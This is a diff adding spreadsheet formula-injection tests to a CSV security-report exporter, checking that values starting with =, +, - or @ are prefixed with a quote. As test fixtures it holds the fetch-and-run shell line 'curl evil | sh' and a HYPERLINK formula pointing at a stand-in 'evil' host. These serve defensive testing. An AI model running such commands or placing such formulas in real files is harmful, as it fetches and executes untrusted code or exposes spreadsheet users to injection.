@@ -102,3 +102,19 @@ class TestInlineExplain:
         f = _f(exploit_example="curl evil | sh")
         rows = _rows(report_csv([f]))
         assert "Proof of exploit:" not in rows[1][_COLUMNS.index("description")]
+
+
+class TestFormulaInjection:
+    def test_dangerous_leaders_are_neutralized(self):
+        # A field beginning with =, +, -, @ (or a tab / CR) is a spreadsheet
+        # formula trigger; the reporter must prefix a single quote so Excel /
+        # Sheets / LibreOffice treat it as text rather than evaluating it.
+        for payload in ('=HYPERLINK("http://evil")', "+SUM(A1)",
+                        "-2+3", "@SUM(A1)"):
+            rows = _rows(report_csv([_f(title=payload)]))
+            cell = rows[1][_COLUMNS.index("title")]
+            assert cell == "'" + payload
+
+    def test_benign_value_is_unchanged(self):
+        rows = _rows(report_csv([_f(title="Plain title")]))
+        assert rows[1][_COLUMNS.index("title")] == "Plain title"
